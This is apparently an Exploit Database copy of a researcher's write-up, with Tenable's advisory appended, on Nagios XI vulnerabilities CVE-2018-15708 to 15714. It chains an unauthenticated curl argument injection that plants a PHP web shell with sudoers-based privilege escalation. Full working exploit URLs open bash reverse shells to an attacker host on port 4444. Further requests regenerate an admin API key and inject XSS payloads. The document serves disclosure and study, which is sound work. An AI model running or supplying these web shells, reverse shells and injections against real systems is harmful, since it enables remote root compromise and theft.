# What’s the deal?

For around six years [Nagios XI](https://www.nagios.com/products/nagios-xi/) could be remotely rooted by an unauthenticated attacker. Nagios XI included an outdated library, [MagpieRSS](http://magpierss.sourceforge.net/) (and therefore, [Snoopy](https://sourceforge.net/projects/snoopy/)). The inclusion of this library created an unauthenticated remote code execution (RCE) vector ([CVE-2018–15708](https://www.tenable.com/security/research/tra-2018-37)) until Nagios patched it in late 2018. A separate vulnerability in Nagios XI, [CVE-2018–15710](https://www.tenable.com/security/research/tra-2018-37), allowed for local privilege escalation (LPE). These vulnerabilities can be combined to gain a root shell on a Nagios XI 5.5.6 instance.

# Why does this matter?

Nagios claims to have over 9,000 customers, [including companies](https://www.nagios.com/#themo_brands_1) such as Cisco and PayPal. A [search on Shodan.io](https://www.shodan.io/search?query=Nagios) for “Nagios” yields over 4,000 results.

# Vulnerability Details

The RCE vulnerability mentioned above merely gains privileges as the ‘apache’ user. Fortunately (or unfortunately, depending on how you look at it), there have been ways to escalate privileges to root on Nagios XI **since version 2012r1.0.** Interestingly enough, the LPE vulnerability in version 2012r1.0 is different from the LPE found in 5.5.6.

## PHP Code Execution via MagpieRSS and Snoopy

Nagios XI includes a vulnerable component. The code execution vulnerability can be triggered by sending a crafted request to magpie\_debug.php. Let’s walk through the code to show how this works. I have added comments to point out the lines of interest. Also, for the sake of brevity, some lines have been removed from the snippets. These lines are denoted by an inline comment of “snip” (e.g. // snip).

Below is magpie\_debug.php. This script can be accessed in a web browser without authentication. Notice that the HTTP GET ‘url’ parameter is passed to the fetch\_rss() function without prior validation or sanitization.

```
// snip
// magpie_debug.php
if ( isset($_GET['url']) ) {
 $url = $_GET['url'];    // 1
}
else {
 $url = 'http://magpierss.sf.net/test.rss';
}
test_library_support();
$rss = fetch_rss( $url );   // 2
// snip
```

The fetch\_rss() function is defined in rss\_fetch.inc. The function accepts a ‘url’ parameter, and if the cache is disabled, the URL is passed to \_fetch\_remote\_file(). Again, this is performed without prior validation. This pattern will become familiar as we step further into the code.

```
// rss_fetch.inc
// snip
function fetch_rss ($url) {
    // initialize constants
    init();

    if ( !isset($url) ) {
        error("fetch_rss called without a url");
        return false;
    }

    // if cache is disabled
    if ( !MAGPIE_CACHE_ON ) {
        // fetch file, and parse it
        $resp = _fetch_remote_file( $url ); // 3
// snip
```

Also defined in rss\_fetch.inc is the \_fetch\_remote\_file() function. In this function, a Snoopy object is created, and the raw URL is passed to the Snoopy fetch() method.

```
// rss_fetch.inc
// snip
function _fetch_remote_file ($url, $headers = "" ) {
    // Snoopy is an HTTP client in PHP
    $client = new Snoopy();             // 4
    $client->agent = MAGPIE_USER_AGENT;
    $client->read_timeout = MAGPIE_FETCH_TIME_OUT;
    $client->use_gzip = MAGPIE_USE_GZIP;
    if (is_array($headers) ) {
        $client->rawheaders = $headers;
    }

    @$client->fetch($url);              // 5
    return $client;}
// snip
```

Now we are looking at code in the Snoopy library. The fetch() method will perform an HTTP GET request (by default) against a given URI. As it relates to the vulnerability, when a URI specifies an **HTTPS** scheme, the \_httpsrequest() method will be called. The URI is passed as the second argument, regardless of whether a proxy is used or not.

```
// Snoopy.class.inc
// snip
function fetch($URI)
{

// preg_match("|^([^:]+)://([^:/]+)(:[\d]+)*(.*)|",$URI,$URI_PARTS);
$URI_PARTS = parse_url($URI);
if (! empty($URI_PARTS["user"]))
    $this->user = $URI_PARTS["user"];
if (! empty($URI_PARTS["pass"]))
    $this->pass = $URI_PARTS["pass"];switch ($URI_PARTS["scheme"]) {
    case "http":
    // snip
    case "https":
        if (! $this->curl_path || (! is_executable($this->curl_path))) {
            $this->error = "Bad curl ($this->curl_path), can't fetch HTTPS \n";
            return false;
        }
        $this->host = $URI_PARTS["host"];
        if (! empty($URI_PARTS["port"]))
            $this->port = $URI_PARTS["port"];
        if ($this->_isproxy) {
          // using proxy, send entire URI
          $this->_httpsrequest($URI, $URI, $this->_httpmethod); //6
        } else {
          $path = $URI_PARTS["path"] . ($URI_PARTS["query"] ? "?" . $URI_PARTS["query"] : "");
          // no proxy, send only the path
          $this->_httpsrequest($path, $URI, $this->_httpmethod); //6
        }
    // snip
```

Finally, we reach the \_httpsrequest() method. I only show the call to [exec](http://php.net/manual/en/function.exec.php)() in this method, though the method definition is much longer. Additionally, I have modified the formatting of the exec call to use multiple lines, so the full invocation is viewable in this snippet.

Anyway, the first argument to exec() is the *command* string. In this call, the command string is generated by concatenating the path to the curl binary, some parameters, and the URI itself. Notice that the cmdline\_params and URI variables are passed to the [escapeshellcmd](http://php.net/manual/en/function.escapeshellcmd.php)() function prior to concatenation. Sadly, the function is being used incorrectly.

```
// Snoopy.class.inc
// snip
function _httpsrequest($url,$URI,$http_method,$content_type="",$body="")
{
    // snip
    exec(
        $this->curl_path." -D \"/tmp/$headerfile\"".
            escapeshellcmd($cmdline_params)." ".
            escapeshellcmd($URI),   // 7
        $results,
        $return
    );
// snip
```

As stated in the PHP documentation, “escapeshellcmd() should be used on the *whole* command string, and it still allows the attacker to pass an arbitrary number of arguments. For escaping a single argument [escapeshellarg()](http://php.net/manual/en/function.escapeshellarg.php) should be used instead.” The proper function to use is escapeshellarg().

Due to this error, **arbitrary arguments may be injected** into the curl command**.**

## Constructing the Exploit

Curl has an option (-o) which enables the user to write the HTTP response to a file instead of standard output:

```
-o, --output FILE Write to FILE instead of stdout
```

Let’s recap on what we know:

1. A URI can be specified to magpie\_debug.php without authentication.
2. If an HTTPS URI is given, the curl binary will be exec()’d to request this URI as-is. No validation or sanitization takes place.
3. Arbitrary arguments can be injected into the curl command.

With this information, the following strategy can be used to execute arbitrary PHP code:

1. Create an **HTTPS** listener that is reachable by the Nagios XI instance.
2. With this listener, host a file containing malicious PHP code.
3. Craft a request to magpie\_debug.php that does the following: a) Specifies a URI pointing to our malicious PHP file. b) **Injects the “-o” flag**, writing the response to a location on disk**.** (Note: The location must be writable by the ‘apache’ user and publicly accessible using a web browser.)

To find a suitable directory, I ran this command:

```
find /usr/local/ -type d -user apache
```

This command searches for directories in /usr/local/ that are owned by the apache user. Fortunately, many directories were returned, and the /usr/local/nagvis/share/ directory is publicly accessible. I searched in /usr/local/ because Nagios XI is hosted here.

**Note**: The directory differs between versions 2012r1.0 and 5.5.6.

## The Exploit, Really

I won’t show you how to create an HTTPS listener (must be **HTTPS**), but you can view it in the [full exploit code](https://github.com/tenable/poc/blob/master/nagios/nagiosxi_556_rce_lpe.py) online. Our listener will respond with the following:

```
<?php system($_GET['cmd']); ?>
```

Assume the Nagios XI instance is located at https://192.168.1.208, and our listener is at https://192.168.1.191:8080. Using the following URL, we can write the PHP code to /usr/local/nagvis/share/exec.php. Notice that “-o /usr/local/nagvis/share/exec.php” is included in the value of the ‘url’ parameter. This tells curl to output the response to this file.

```
https://192.168.1.208/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url=https://192.168.1.191:8080/%20-o%20/usr/local/nagvis/share/exec.php
```

Once this request is completed, the attacker can execute arbitrary system commands by requesting a URL like this:

```
https://192.168.1.208/nagvis/exec.php?cmd=whoami
```

However, the ‘whoami’ command returns ‘apache’. Let’s take a look at how to escalate privileges to root.

## Multiple Local Privilege Escalations

There are two reasons why privilege escalation is possible in version 5.5.6:

1. A command injection vulnerability exists in a particular PHP script.
2. This script can be launched using ‘sudo’ without a password due to an entry in the /etc/sudoers file.

Interestingly enough, the same /etc/sudoers configuration is in place in version 2012r1.0, but code execution is gained with a different binary (nmap).

Let’s take a look at 5.5.6 first.

## */etc/sudoers*

While enumerating the operating system inside an SSH session, I found some intriguing entries in the /etc/sudoers file:

```
User_Alias      NAGIOSXI=nagios
User_Alias      NAGIOSXIWEB=apache
...
NAGIOSXI ALL = NOPASSWD:/usr/bin/php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php *
...
NAGIOSXIWEB ALL = NOPASSWD:/usr/bin/php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php *
```

These entries enable the ‘nagios’ and ‘apache’ users to execute the ‘autodiscover\_new.php’ script with ‘sudo’, and arbitrary arguments can be supplied. No password will be prompted for. Essentially, this entry makes the PHP file as juicy as a root-owned executable with the [SUID](https://www.linux.com/blog/what-suid-and-how-set-suid-linuxunix) bit set.

The only question is, how can code be executed with this script?

## SourceGuardian PHP Encoder

Ever heard of [SourceGuardian](https://www.sourceguardian.com/)? I hadn’t. And I won’t forget it. It’s a protection mechanism that compiles PHP source code and then encrypts it. For the security researcher, this makes life a bit more difficult. Instead of simply being able to read the PHP source of autodiscover\_new.php, the source looks like this (though this is only a snippet):

![]()

autodiscover\_new.php

Notice the call to sg\_load() and its argument. The actual string argument to be loaded is **much** longer. This string is loaded by SourceGuardian to decrypt and execute the compiled byte code.

Fortunately we can still perform dynamic analysis on the script to try and figure out how it works. I first tried to launch the script with the ‘ — help’ flag to see if a help prompt would show.

```
$ php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --help
#/usr/bin/php -q

License: Nagios Open Software License <<http://www.nagios.com/legal/licenses>>Usage: /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --addresses=<scanrange> [--ignore=<ignore>] [--parent=<parent>] [--output=<output>] [--onlynew=<new>]<scanrange>    = The IP addresses or network ranges to scan.
   <ignore>       = IP addresses to ignore.
   <parent>       = Default parent for newly found devices.
   <option>       = File used to store results.
```

As you can see, this yielded some results. Based on the output, it’s reasonable to assume that this script will discover devices on a network within a specified IP address range. My first thought was to try and scan localhost.

```
$ php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --addresses=127.0.0.1
#/usr/bin/php -q
WARNING: No targets were specified, so 0 hosts scanned.Starting Nmap 6.47 ( <http://nmap.org> ) at 2018-11-06 05:07 EST
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.02 seconds
<scanresults>
</scanresults>
```

My next thought was to provide a CIDR with a prefix of 0 to see if it worked (127.0.0.1/0). I got the same result. Next, I tried a prefix of 1. The results were quite interesting.

```
$ php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --addresses=127.0.0.1/1
#/usr/bin/php -q
sh: line 1:  7797 Killed                  /usr/sbin/fping -a -r 1 -g 127.0.0.1/1 2> /dev/nullStarting Nmap 6.47 ( <http://nmap.org> ) at 2018-11-06 05:08 EST
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.35 seconds
<scanresults>
</scanresults>
```

Based on this output, it looks like the ‘fping’ executable is being launched with our CIDR being incorporated in the command. Immediately this evokes thoughts of the possibility for command injection. Before I got too trigger-happy, I decided to perform an ‘strace’ to watch what system calls take place during execution. Specifically, we are looking for a system call which launches fping (possibly an exec variant).

```
$ strace -s 200 -f -o strace.txt php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --addresses=127.0.0.1/1
```

Basically, this command will perform a system call trace during the execution of autodiscover\_new.php. Forks will be followed (-f), output will be limited to a length of 200 characters (-s 200) instead of 32 by default, and the results will be written to strace.txt.

I found a few lines in the output that verify the possibility of a command injection vulnerability:

```
execve("/bin/sh", ["sh", "-c", "/usr/sbin/fping -a -r 1 -g 127.0.0.1/1 2> /dev/null"], [/* 26 vars */]) = 0
execve("/usr/sbin/fping", ["/usr/sbin/fping", "-a", "-r", "1", "-g", "127.0.0.1/1"], [/* 25 vars */]) = 0
```

Clearly, fping is being executed, and our input (“127.0.0.1/1") is concatenated into the command. I’m leaving out some details here because there are loads of resources online about how to find a command injection vulnerability. It requires some trial and error. Trust me when I say, “there is a vulnerability.”

Let’s just see the privilege escalation exploit already!

## The 5.5.6 Exploit — autodiscover\_new.php

Hold on for one moment. As of now, we know the following:

1. The /etc/sudoers file allows autodiscover\_new.php to be executed with sudo without a password (by ‘nagios’ or ‘apache’).
2. A command injection vulnerability exists in autodiscover\_new.php.

With this in mind, we can exploit the command injection while running the script with sudo to gain a root shell (with no password). Here is the exploit in action. Note that this example is performed by the ‘nagios’ user. The ‘apache’ user isn’t allowed to log into a shell. But remember, *they have the same access rights in the /etc/sudoers file*.

```

## 2012r1.0 Exploit — Elevating Privileges via Nmap Scripting Engine

The privilege escalation technique is similar in the 2012r1.0 version of Nagios XI. Again, there is an entry in /etc/sudoers that enables the ‘apache’ user to execute a command without a password. However, it’s different in this version. Instead of autodiscover\_new.php, the ‘nmap’ binary is specified.

But how do we execute shell commands with Nmap? There is a nifty feature of Nmap called the [Nmap Scripting Engine](https://nmap.org/book/nse.html) (NSE) that allows users to write custom scripts that Nmap can execute. The NSE is based on Lua, so in order to execute shell commands with Nmap, we can write some basic Lua using the ‘[os.execute](https://www.lua.org/manual/5.1/manual.html#pdf-os.execute)’ function. Again, the test is performed by the ‘nagios’ user.

```
$ whoami
nagios
$ echo 'os.execute("/bin/bash")' > /var/tmp/shell.nse && sudo nmap --script /var/tmp/shell.nseStarting Nmap 5.51 ( <http://nmap.org> ) at 2018-11-06 01:42 EST
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```
## Combining the Exploits

Let’s take a second to remember what we have accomplished:

1. We have a way to execute PHP code remotely without authentication.
2. We can locally escalate privileges to gain a root shell.

If we put these two together, we can **pop a root shell remotely**. Again, we first have to exploit magpie\_debug.php to give us PHP code execution. Once we have this, the privilege escalation can be leveraged. However, if we want a *remote* shell, we will need to alter the payload. I have utilized a common Bash one-liner to connect back to my listening Netcat instance.

Below is the Netcat listener:

```
$ nc -l 4444
```

Here is the URL to visit in order to fire off the connect-back. I’ve listed two URLs as they are different depending on the target version of Nagios XI.:

## 5.5.6

```
https://192.168.1.208/nagvis/exec.php?cmd=sudo%20php%20%2Fusr%2Flocal%2Fnagiosxi%2Fhtml%2Fincludes%2Fcomponents%2Fautodiscovery%2Fscripts%2Fautodiscover_new.php%20--addresses%3D%27127.0.0.1%2F0%60%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.191%2F4444%200%3E%261%60%27
```
## 2012r1.0

```
https://192.168.1.208/nagiosql/exec.php?cmd=echo%20%27os.execute%28%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.191%2F4444%200%3E%261%22%29%27%20%3E%3E%20%2Fvar%2Ftmp%2Fshell.nse%20%26%26%20sudo%20nmap%20-p%2080%20192.168.1.1%20--script%20%2Fvar%2Ftmp%2Fshell.nse
```

Once the reverse shell connects back, the following output is displayed in the Netcat session. We can interact with the shell as the **root** user.:

```
$ nc -l 4444
bash: no job control in this shell
# whoami
whoami
root
# id
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
```
# Final Notes

I’d like to point out that these vulnerabilities, while the most severe, were not the only bugs found in Nagios XI. For more information, check out the [Tenable Research Advisory](https://www.tenable.com/security/research/tra-2018-37). Also, Nagios was a pleasure to work with during the disclosure process. Communications were timely, and a patch was issued very quickly. Take a look at their [security issues page](https://www.nagios.com/products/security/) for remediation guidance.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# [R2] Nagios XI Multiple Vulnerabilities

High

[← View More Research Advisories](/security/research)
### Synopsis

Tenable has discovered multiple vulnerabilities in Nagios XI 5.5.6.

#### CVE-2018-15708: Magpie\_debug.php Unauthenticated RCE via Command Argument Injection

A critical vulnerability exists in the MagpieRSS library. This library contains a custom version of the Snoopy component which allows a remote, unauthenticated attacker to inject arbitrary arguments into a "curl" command. By requesting magpie\_debug.php with a crafted value specified in the HTTP GET 'url' parameter, the vulnerable component can be exploited to write arbitrary data to a location on disk that is writable by the 'apache' user. For instance, the location /usr/local/nagvis/share/ is writable and publicly accessible. If an attacker were to write PHP code to this location, arbitrary code execution may be achieved with the privileges of the apache user.

Combined with the local privilege escalation vulnerability, arbitrary code execution with root privileges is feasible.

Magpie\_debug.php accepts an HTTP GET parameter, 'url', and subsequently calls fetch\_rss() with the URL as an argument. The fetch\_rss function is defined in /usr/local/nagiosxi/html/includes/dashlets/rss\_dashlet/magpierss/rss\_fetch.inc and is used to perform an HTTP request against the provided URL. Digging further, the \_fetch\_remote\_file() function is called, which then instantiates a Snoopy object. The fetch() method of the Snoopy class is then called, which eventually ends up calling the \_httpsrequest() method if an HTTPS URL was specified.

Specifically, the problematic code relates to this line in Snoopy.class.inc:

```

exec($this->curl_path." -D \"/tmp/$headerfile\"".escapeshellcmd($cmdline_params)." ".escapeshellcmd($URI),$results,$return);

```

A remote attacker can exploit this flaw without difficulty.

##### Proof of Concept

Suppose an attacker sets up a web server at https://192.168.1.191:8080/. The attacker configures the server to respond with PHP code. Something like this:

```

<?php system($_GET['cmd']); ?>

```

The Nagios XI instance is located at https://192.168.1.208. Using the following URL, the attacker may exploit the flaw in the Snoopy class and write the PHP code to /usr/local/nagvis/share/exec.php. Notice that “-o /usr/local/nagvis/share/exec.php” is included in the value of the ‘url’ parameter. This tells curl to output the response to this file.

```

https://192.168.1.208/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url=https://192.168.1.191:8080/%20-o%20/usr/local/nagvis/share/exec.php

```

Once this request is completed, the attacker can execute arbitrary system commands by crafting a URL like such:

```

https://192.168.1.208/nagvis/exec.php?cmd=whoami

```
#### CVE-2018-15709: Cmdsubsys.php Authenticated Command Injection

The Nagios subsystem is vulnerable to command injection in many cases. An authenticated attacker may inject and execute arbitrary OS commands. This can be accomplished by a low-privileged user (non-admin).

Ultimately, the subsystem commands are handled by /usr/local/nagiosxi/cron/cmdsubsys.php.

The proof of concept below exploits the command COMMAND\_NAGIOSXI\_SET\_HTACCESS (1100) by injecting OS commands into the 'password' field. A code snippet is provided to show the vulnerable code. Please note that this is not the only vulnerable command.

```

case COMMAND_NAGIOSXI_SET_HTACCESS:
	$cmdarr = unserialize($command_data);
	$cmdline = $cfg['htpasswd_path']." -b -s ".$cfg['htaccess_file']." ".$cmdarr["username"]." '".$cmdarr["password"]."'";
	break;
...
$output = system($cmdline, $return_code);

```
##### Proof of Concept

Be sure to replace the IP address and ‘nsp’ value accordingly.

```

https://192.168.1.208/nagiosxi/ajaxhelper.php?cmd=submitcommand&opts={%22cmd%22:1100,%22cmddata%22:{%22username%22:%22test%22,%22password%22:%22test%27%3bwhoami%20%3E%20/usr/local/nagiosxi/tmp/whoami.txt%3b%27%22},%22cmdtime%22:0,%22cmdargs%22:%22%22}&nsp=30a86418c0953be277b67c5149f9b4be762f08e14a92fcbece756922f5df2312

```

Afterward, it can be verified that the command worked as expected. Notice the user is ‘nagios’.

```

$ cat /usr/local/nagiosxi/tmp/whoami.txt
nagios

```
#### CVE-2018-15710: Autodiscover\_new.php Local Privilege Escalation via Command Injection

autodiscover\_new.php suffers from a local command injection vulnerability which can be exploited to gain root OS privileges. This file is protected by Source Guardian, so a full root cause analysis cannot be conducted. However, based on results of black box testing, it is clear that the value of the 'addresses' command line parameter is incorporated in a subsequent call to a dangerous PHP function used to launch another process. Furthermore, the value is unsanitized before being used to construct the command line. This coding flaw allows an attacker to inject and execute arbitrary shell commands.

Additionally, the /etc/sudoers file contains entries that enable this PHP script to be launched with root privileges without a password.

```

User_Alias      NAGIOSXI=nagios
User_Alias      NAGIOSXIWEB=apache
...
NAGIOSXI ALL = NOPASSWD:/usr/bin/php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php *
...
NAGIOSXIWEB ALL = NOPASSWD:/usr/bin/php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php *

```
##### Proof of Concept

If we put it all together, the 'apache' and 'nagios' users may exploit the command injection flaw to gain root privileges. Note that the payload in this case is a reverse bash shell connecting back to 192.168.1.191 over TCP port 4444.

```

sudo php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --addresses='127.0.0.1/0;/bin/bash -i >& /dev/tcp/192.168.1.191/4444 0>&1;'

```
#### CVE-2018-15711: Unauthorized API Key Regeneration

A low-privileged, authenticated user can force API key regeneration for any Nagios XI user (including admins). When the API key is regenerated, a new one is returned in the response body. This enables the malicious user to then perform subsequent API calls with an elevated level of permissions. For instance, a new admin user could be created.

##### Proof of Concept

The following URL can be used to regenerate the API key for a user with ID 1 (nagiosadmin). Take note that the IP address and 'nsp' value will need to be updated accordingly.

```

https://192.168.1.208/nagiosxi/ajaxhelper.php?cmd=getxicoreajax&opts={%22func%22:%22set_random_api_key%22,%22args%22:{%22user_id%22:1}}&nsp=cc326511f1d7384bb9bf4ff619c9db91756574acb65217d27109923d6647a37e

```

The associated response looks like such:

```

HTTP/1.1 200 OK
Date: Tue, 23 Oct 2018 18:56:07 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache

Content-Type: text/html; charset=UTF-8

XKrjj3f20Fr49jiQF5E2LkZ3bl9spABmAjYSFdUV9FZBeBHTGhbnEaJ5PSQeIoTe

```

Note that the API key returned belongs to the user for which it was regenerated. In this case, the API key belongs to nagiosadmin. This serves as a privilege escalation within the Nagios XI application because more functionality can now be invoked.

For example, a new admin user could be added.

```

https://192.168.1.208/nagiosxi/api/v1/add_user&apikey=XKrjj3f20Fr49jiQF5E2LkZ3bl9spABmAjYSFdUV9FZBeBHTGhbnEaJ5PSQeIoTe&username=scrappy&password=scrappy&[[email protected]](/cdn-cgi/l/email-protection)&name=scrappy+do&auth_level=admin&api_enabled=1&force_pw_change=0&can_see_all_hs=1&can_control_all_hs=1&can_reconfigure_hs=1&can_control_engine=1&can_use_advanced=1

```
#### CVE-2018-15712: Api\_tool.php Unauthenticated Persistent Cross-site Scripting

A persistent cross-site scripting (XSS) vulnerability exists in the Nagios XI Business Process Intelligence (BPI) component's api\_tool.php. The file located at /usr/local/nagiosxi/etc/components/bpi.conf can be tampered with. An attacker is able to inject new entries by crafting the HTTP GET 'host' parameter value. This file is read by /nagiosxi/includes/components/nagiosbpi/index.php when a user opens the BPI view.
A bpi.conf file that was tampered with could end up looking like the following. Take note of the second entry:

```

define linux-servers {
        title=HG: linux-servers
        desc=
        primary=1
        info=
        members=localhost;NULL;&, hello
}
define <script>alert(1)</script> {
desc=</strong><script>alert(2)</script>;NULL;&,
        warning_threshold=0
        critical_threshold=0
        priority=0
        type=hostgroup
        auth_users=
}

```
##### Proof of Concept

Note: Be sure to change IP addresses to match your environment.
Two requests are required to inject the XSS payload:

```

https://192.168.1.208/nagiosxi/includes/components/nagiosbpi/api_tool.php?cmd=syncall

https://192.168.1.208/nagiosxi/includes/components/nagiosbpi/api_tool.php?cmd=addmember&group=linux-servers&host=hello%0a}%0adefine%20%3Cscript%3Ealert(1)%3C/script%3E%20{%0adesc=%3C/strong%3E%3Cscript%3Ealert(2)%3C/script%3E

```

Once these have completed, login with a valid user and visit the following URL:

```

https://192.168.1.208/nagiosxi/includes/components/nagiosbpi/index.php

```
#### CVE-2018-15713: Users.php Authenticated Persistent Cross-site Scripting A persistent cross-site scripting vulnerability was discovered in Nagios XI in admin/users.php. This vulnerability requires authentication to be exploited successfully. Specifically, the vulnerability exists due to the lack of input validation when displaying a user's e-mail address on admin/users.php. This value can be defined by modifying a user's e-mail address via /account/main.php or /admin/users.php. Users.php requires an administrator level of access; however, main.php does not. This means that a low-privileged user can inject an XSS payload, and an admin user will be impacted by the attack. Fortunately, cookies are flagged as 'httpOnly', so malicious JavaScript can't access the session ID stored in the cookie. However, the Nagios Session Protector (nsp) value may be accessed because it is stored in the DOM. This will allow an attacker to steal these tokens and subsequently create malicious forms or links to facilitate request forgery. Proof of Concept In order to test the PoC’s, replace the IP address with an accessible IP or hostname which has a Nagios XI instance installed/configured, update the 'nsp' value, and update the cookie accordingly. ``` POST /nagiosxi/account/main.php?page=acctinfo HTTP/1.1 Host: 192.168.1.208 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://192.168.1.208/nagiosxi/account/main.php?&= Content-Type: application/x-www-form-urlencoded Content-Length: 359 Cookie: nagiosxi=sg3pa9fi5e4ngj6a4jgm287jg7 Connection: close Upgrade-Insecure-Requests: 1 update=1&nsp=e7fc3b0557861b1f39d6a2827edcf515086c7f2ec96acdd885a952266ba437be&current_password=&password1=&password2=&name=Scooby+Doo&email=%3Cscript%3Ealert%28%22hello+poppet%22%29%3C%2Fscript%3Escooby1%40tenable.com&language=en_US&theme=&highcharts_default_type=line&defaultDateFormat=1&defaultNumberFormat=2&defaultWeekFormat=0&updateButton=Update+Settings POST /nagiosxi/admin/users.php?edit=1&user_id[]=2 HTTP/1.1 Host: 192.168.1.208 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0) Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://192.168.1.208/nagiosxi/admin/users.php?edit=1&user_id[]=2 Content-Type: application/x-www-form-urlencoded Content-Length: 498 Cookie: nagiosxi=sg3pa9fi5e4ngj6a4jgm287jg7 Connection: close Upgrade-Insecure-Requests: 1 update=1&nsp=02bc33485c2fd6edac30ee7e7af1a2f14d47c36ffb9cd8c9b5e74721bb886dbd&users=1&user_id%5B%5D=2&username=scooby&password1=&password2=&name=Scooby+Doo&email=%3Cscript%3Ealert%28nsp_str%29%3C%2Fscript%3Escooby1%40tenable.com&phone=&enable_notifications=on&enabled=on&language=en_US&defaultDateFormat=1&defaultNumberFormat=2&defaultWeekFormat=0&auth_type=local&ad_username=&dn=&level=1&ccm_access=0&apikey=jt2ZRc3fdPnn6VSKn3QZZdSVabJp7tbJZcY8n2mT7MBcYpdFMjU2PMXYeWHkpRkJ&updateButton=Update+User ``` CVE-2018-15714 - Checkauth.php Reflected Cross-site Scripting A reflected cross-site scripting vulnerability exists within account/checkauth.php. The HTTP GET 'oname' parameter is not processed safely; therefore, malicious JavaScript can be injected and executed. Other parameters are exploitable as well (such as 'oname2'); For example, the following code snippet from checkauth.php outputs the values of the 'oname' and 'oname2' parameters into the HTML response. ``` <td>Object Name:</td> <td><input type="text" name="oname" value="<?php echo $oname; ?>" size="15"> <input type="text" name="oname2" value="<?php echo $oname2; ?>" size="15"></td> ``` Proof of Concept ``` https://192.168.1.208/nagiosxi/account/checkauth.php?oname=" autofocus onfocus="javascript:alert(nsp_str) ```
